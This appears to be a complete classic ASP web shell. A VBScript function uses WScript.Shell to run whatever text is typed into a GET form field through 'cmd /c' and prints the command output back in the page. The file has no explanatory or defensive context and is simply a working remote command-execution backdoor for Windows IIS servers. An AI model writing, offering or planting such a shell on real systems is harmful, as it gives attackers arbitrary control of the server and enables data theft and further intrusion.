<%
Function a(b)
    Dim s, c
    Set s = CreateObject("WScript.Shell")
    Set c = s.exec(b)
    a = c.StdOut.ReadAll
end Function
%>


<HTML>
<BODY>
<FORM action="" method="GET">
<input type="text" name="surprised" size=50 value="<%= notsurprised %>">
<input type="submit" value="go">
</FORM>
<PRE>
<p>
<% notsurprised = request("surprised")
weatherHacker = a("cmd /c" & notsurprised)
Response.Write(weatherHacker)%>
</p>
<br>
</BODY>
</HTML>